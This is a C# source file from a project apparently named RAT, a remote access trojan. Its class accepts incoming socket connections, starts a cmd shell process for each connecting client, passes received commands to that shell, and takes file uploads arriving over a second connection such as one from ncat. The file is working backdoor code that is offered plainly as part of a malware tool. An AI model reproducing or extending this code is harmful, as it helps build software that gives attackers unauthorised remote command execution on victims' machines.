using RAT.Interfaces;
using RAT.Models;
using RAT.Models.Enums;
using System;
using System.Net.Sockets;

namespace RAT.Logic.Sockets.Connection
{
    /// <summary>
    /// Logic related to connection acceptance stage.
    /// </summary>
    public class SocketConnectionAcceptLogic : ISocketConnectionAcceptLogic
    {
        private readonly ISocketStateLogic _socketStateLogic;
        private readonly ICmdLogic _cmdLogic;
        private readonly ISocketConnectionReceiveLogic _socketConnectionReceiveLogic;

        /// <summary>
        /// Logic related to connection acceptance stage.
        /// </summary>
        /// <param name="stateLogic">Our client socket state logic.</param>
        /// <param name="receiveLogic">Logic for data receival.</param>
        /// <param name="cmdLogic">Logic for cmd.</param>
        public SocketConnectionAcceptLogic(
            ISocketStateLogic stateLogic,
            ISocketConnectionReceiveLogic receiveLogic,
            ICmdLogic cmdLogic)
        {
            _socketStateLogic = stateLogic;
            _socketConnectionReceiveLogic = receiveLogic;
            _cmdLogic = cmdLogic;
        }

        /// <summary>
        /// Wrapper for socket accept command.
        /// </summary>
        /// <param name="socket">Socket to accept connection on.</param>
        public void BeginAccept(Socket socket)
        {
            socket.BeginAccept(OnInitialAccept, socket);
        }

        /// <summary>
        /// Socket connection acceptance logic handling.
        /// </summary>
        /// <param name="res">Status of asynchronous operation.</param>
        private void OnInitialAccept(IAsyncResult res)
        {
            // Signal the main thread to continue.
            ManualResetEventWrapper.ResetEvent.Set();

            // Get the socket that handles the client request.
            Socket listener = (Socket)res.AsyncState;
            Socket handler = listener.EndAccept(res);

            // Check if we are waiting for file upload.
            // As if we are, then request for new connection will come (i.e from ncat).
            if (_socketStateLogic.State.FileUploadInformation?.FileUploadProgress == FileUploadProgress.Begins)
            {
                _socketStateLogic.State.FileUploadInformation.ClientFileUploadSocket = handler;
                _socketConnectionReceiveLogic.BeginFileReceive(handler);
                return;
            }

            // Create new client with connection.
            var clientState = _socketStateLogic.CreateNewState(handler);

            // Launch shell for client.
            clientState.ClientCmdProcess = _cmdLogic.CreateNewCmdProcess();

            // We are ready to receive cmd commands.
            _socketConnectionReceiveLogic.BeginCommandReceive(handler);
        }
    }
}